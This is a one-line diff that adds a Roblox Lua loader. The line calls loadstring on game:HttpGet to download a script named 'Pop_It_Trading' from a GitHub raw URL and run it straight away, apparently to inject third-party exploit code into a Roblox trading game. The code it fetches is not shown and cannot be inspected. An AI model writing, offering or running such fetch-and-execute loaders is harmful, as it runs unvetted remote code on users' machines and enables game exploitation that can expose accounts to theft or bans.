@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sombolian/scripts/main/Pop_It_Trading'))()
